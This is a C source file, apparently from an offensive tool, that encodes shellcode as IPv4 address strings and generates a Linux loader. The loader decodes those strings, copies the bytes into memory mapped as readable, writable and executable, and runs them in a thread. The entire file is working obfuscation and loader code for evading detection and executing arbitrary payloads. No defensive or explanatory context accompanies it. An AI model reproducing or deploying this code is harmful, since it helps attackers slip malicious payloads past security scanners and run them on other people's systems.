#include "ipv4fuscation.h"

static uint32_t generate_ipv4_hex(int a, int b, int c, int d) {
    return ((uint32_t)a << 24) | ((uint32_t)b << 16) | (c << 8) | d;
}

static void format_ipv4_address(uint32_t ip, char* output, size_t output_size) {
    unsigned char bytes[4];
    bytes[0] = ip & 0xFF;
    bytes[1] = (ip >> 8) & 0xFF;
    bytes[2] = (ip >> 16) & 0xFF;
    bytes[3] = (ip >> 24) & 0xFF;
    
    snprintf(output, output_size, "%d.%d.%d.%d", 
             bytes[3], bytes[2], bytes[1], bytes[0]);
}

bool generate_ipv4_output(const char* output_file) {
    if (!write_shellcode_file(output_file)) {
        return false;
    }
    
    FILE* f = g_payload.output_file;
    
    fprintf(f, "#include <stdio.h>\n");
    fprintf(f, "#include <stdlib.h>\n");
    fprintf(f, "#include <string.h>\n");
    fprintf(f, "#include <sys/mman.h>\n");
    fprintf(f, "#include <unistd.h>\n");
    fprintf(f, "#include <arpa/inet.h>\n");
    fprintf(f, "#include <pthread.h>\n\n");
    
    fprintf(f, "// IPv4 to binary decoder for Linux\n");
    fprintf(f, "int decode_ipv4_fuscation(const char* ipv4[], unsigned char* output, int count) {\n");
    fprintf(f, "    struct in_addr addr;\n");
    fprintf(f, "    int offset = 0;\n\n");
    fprintf(f, "    for (int i = 0; i < count; i++) {\n");
    fprintf(f, "        if (inet_pton(AF_INET, ipv4[i], &addr) != 1) {\n");
    fprintf(f, "            fprintf(stderr, \"Failed to convert: %%s\\n\", ipv4[i]);\n");
    fprintf(f, "            return -1;\n");
    fprintf(f, "        }\n");
    fprintf(f, "        memcpy(output + offset, &addr, 4);\n");
    fprintf(f, "        offset += 4;\n");
    fprintf(f, "    }\n");
    fprintf(f, "    return 0;\n");
    fprintf(f, "}\n\n");
    
    fprintf(f, "const char* IPv4Shell[] = {\n    ");
    
    int count = 0;
    char ip_str[32];
    
    for (size_t i = 0; i < g_payload.final_size; i += 4) {
        if (i + 3 < g_payload.final_size) {
            uint32_t hex = generate_ipv4_hex(
                g_payload.p_new_shell[i],
                g_payload.p_new_shell[i + 1],
                g_payload.p_new_shell[i + 2],
                g_payload.p_new_shell[i + 3]
            );
            
            format_ipv4_address(hex, ip_str, sizeof(ip_str));
            
            if (i + 4 >= g_payload.final_size) {
                fprintf(f, "\"%s\"", ip_str);
            } else {
                fprintf(f, "\"%s\", ", ip_str);
            }
            
            count++;
            
            if (count % 8 == 0) {
                fprintf(f, "\n    ");
            }
        }
    }
    
    fprintf(f, "\n};\n\n");
    fprintf(f, "#define ELEMENTS_COUNT %d\n", count);
    fprintf(f, "#define SHELLCODE_SIZE %zu\n\n", g_payload.final_size);
    
    fprintf(f, "int main() {\n");
    fprintf(f, "    unsigned char shellcode[SHELLCODE_SIZE];\n");
    fprintf(f, "    void* exec_mem;\n");
    fprintf(f, "    pthread_t thread;\n\n");
    fprintf(f, "    printf(\"[*] Decoding IPv4 shellcode...\\n\");\n");
    fprintf(f, "    if (decode_ipv4_fuscation(IPv4Shell, shellcode, ELEMENTS_COUNT) != 0) {\n");
    fprintf(f, "        return -1;\n");
    fprintf(f, "    }\n\n");
    fprintf(f, "    // Allocate executable memory\n");
    fprintf(f, "    exec_mem = mmap(NULL, SHELLCODE_SIZE,\n");
    fprintf(f, "                    PROT_READ | PROT_WRITE | PROT_EXEC,\n");
    fprintf(f, "                    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);\n\n");
    fprintf(f, "    if (exec_mem == MAP_FAILED) {\n");
    fprintf(f, "        perror(\"mmap failed\");\n");
    fprintf(f, "        return -1;\n");
    fprintf(f, "    }\n\n");
    fprintf(f, "    memcpy(exec_mem, shellcode, SHELLCODE_SIZE);\n");
    fprintf(f, "    printf(\"[+] Shellcode at: %%p\\n\", exec_mem);\n\n");
    fprintf(f, "    // Execute in thread\n");
    fprintf(f, "    pthread_create(&thread, NULL, (void*(*)(void*))exec_mem, NULL);\n");
    fprintf(f, "    printf(\"[+] Press Enter to exit...\\n\");\n");
    fprintf(f, "    getchar();\n\n");
    fprintf(f, "    munmap(exec_mem, SHELLCODE_SIZE);\n");
    fprintf(f, "    return 0;\n");
    fprintf(f, "}\n");
    
    fclose(f);
    printf("[+] IPv4 output written to %s\n", output_file);
    return true;
}